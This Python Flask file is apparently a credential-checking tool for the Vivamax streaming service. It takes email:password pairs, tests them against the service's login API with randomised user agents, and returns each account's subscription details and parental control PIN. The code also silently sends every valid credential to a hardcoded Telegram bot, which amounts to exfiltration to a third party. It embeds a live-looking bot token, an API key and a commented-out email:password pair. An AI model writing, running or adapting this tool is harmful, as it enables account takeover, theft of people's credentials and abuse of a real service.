from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
from datetime import datetime
import pytz
from fake_useragent import UserAgent
# from telegram import Bot
# from aiogram import Bot
app = Flask(__name__)
CORS(app)
def send_telegram_message(message):
    try:
        bot_token = '7360858116:AAFaPEE7lu38gXmC2F_lBGQ2mi0ujEHQx8o'
        username = '1465561246'
    
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={username}&text={message}"

        requests.get(url)
    except Exception as e:
        send_message(message)
@app.route('/vivacheck', methods=['GET'])
def vivacheck():
    key='AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U'
    ua = UserAgent()
    random_user_agent = ua.random
    creds = request.args.get('creds')
    if not creds:
        return jsonify({"error": "No credentials provided"}), 200

    try:
        email, password = creds.split(':')
    except ValueError:
        return jsonify({"error": "Invalid credentials format"}), 200

    viva_payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://vivamax.net",
        "referer": "https://vivamax.net/",
        "user-agent": random_user_agent,
        "x-client-version": "Chrome/JsCore/8.10.1/FirebaseCore-web"
    }

    try:
        response = requests.post(
            f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={key}",
            json=viva_payload,
            headers=headers
        )
        # response.raise_for_status()
        login1_response = response.json()
        # return login1_response
        if login1_response.get("error", {}).get("code") == 400:
            return jsonify({'Error': 'Wrong Email or Password'})
        if 'idToken' not in login1_response:
            return jsonify({"error": "Invalid login1_response"}), 200

        # First POST request to login
        login3 = requests.post(
            'https://api2.vivamax.net/v1/viva/login',
            json={
                "deviceId": "-3023350",
                "deviceName": "Win32",
                "deviceType": "COMP",
                "idToken": login1_response['idToken'],
                "modelNo": "20030107",
                "serialNo": "-3023350"
            }
        )

        login3_response = login3.json()
        # return login3_response
        sess = ''
        if login3_response.get('error') == 'Exceed Devices Limit':
            index = 0
            while True:
                sess = requests.get('https://api2.vivamax.net/v1/viva/profile?sessionToken=' +
                                    login3_response.get('devices')[index]['sessionToken'])

                if sess.json().get('message') != "Session token expired":
                    break
                # ranzpac20@gmail.com:lloyd321
                # print('sessionToken',login3_response.get('devices')[index]['sessionToken'])
                index += 1
                if index >= len(login3_response.get('devices')):
                    return jsonify({"error": "No active session token found"})
            if sess.json().get('subscriptionStatus'):
                message = f"{email}:{password}\nSubscription Status: {sess.json().get('subscriptionStatus')}\n" \
                  f"Subscription Location: {sess.json().get('subscriptionLocation')}\n" \
                  f"Subscription ID: {sess.json().get('subscriptionId')}\n" \
                  f"Parental Control Pin: {sess.json().get('parentalControlPin')}"
                send_telegram_message(message)
                return jsonify({
                    "emeylpassword": f"{email}:{password}",
                    "subscriptionStatus": sess.json().get('subscriptionStatus'),
                    "subscriptionLocation": sess.json().get('subscriptionLocation'),
                    "subscriptionId": sess.json().get('subscriptionId'),
                    #"subscriptionExpiryTime": pytz.timezone("Asia/Manila").localize(datetime.fromtimestamp(sess.json().get('subscriptionExpiryTime') / 1000)).strftime("%Y-%m-%d %H:%M:%S"),
                    "parentalControlPin": sess.json().get('parentalControlPin')
                    #"nextAvailableDownload": sess.json().get('nextAvailableDownload')
                })

            elif sess.json().get('subscription') and sess.json().get('subscription').get('status'):
                # return "elif"
                message = f"{email}:{password}\nSubscription Status: {sess.json().get('subscription')['status']}\n" \
                  f"Subscription Location: {sess.json().get('subscription', {}).get('location') or sess.json().get('registerLocation')}\n" \
                  f"Parental Control Pin: {sess.json().get('parentalControlPin')}"
                send_telegram_message(message)
                return jsonify({
                    "emeylpassword": f"{email}:{password}",
                    "subscriptionStatus": sess.json().get('subscription')['status'],
                    "subscriptionLocation": sess.json().get('subscription', {}).get('location') or sess.json().get('registerLocation'),
                    # "subscriptionId": sess.json().get('subscription')['id'],
                    # "subscriptionExpiryTime": pytz.timezone("Asia/Manila").localize(datetime.fromtimestamp(sess.json().get('subscription')['expiryTime'] / 1000)).strftime("%Y-%m-%d %H:%M:%S"),
                    "parentalControlPin": sess.json().get('parentalControlPin')
                    #"nextAvailableDownload": sess.json().get('nextAvailableDownload')
                })
            else:
                return jsonify({"message": "else"}, sess.json())
        else:
            message = f"{email}:{password}\nSubscription Status: {login3_response.get('subscriptionStatus')}\n" \
                  f"Subscription Location: {login3_response.get('subscriptionLocation')}\n" \
                  f"Subscription ID: {login3_response.get('subscriptionId')}\n" \
                  f"Parental Control Pin: {login3_response.get('parentalControlPin')}"
            send_telegram_message(message)
            return jsonify({
                "emeylpassword": f"{email}:{password}",
                "subscriptionStatus": login3_response.get('subscriptionStatus'),
                "subscriptionLocation": login3_response.get('subscriptionLocation'),
                "subscriptionId": login3_response.get('subscriptionId'),
                # "subscriptionExpiryTime": pytz.timezone("Asia/Manila").localize(datetime.fromtimestamp(login3_response.get('subscriptionExpiryTime') / 1000)).strftime("%Y-%m-%d %H:%M:%S"),
                "parentalControlPin": login3_response.get('parentalControlPin')
                #"nextAvailableDownload": login3_response.get('nextAvailableDownload')
            })
    except requests.RequestException as e:
        return jsonify({"Error": "Wrong Email Or Passwordzzz"}), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
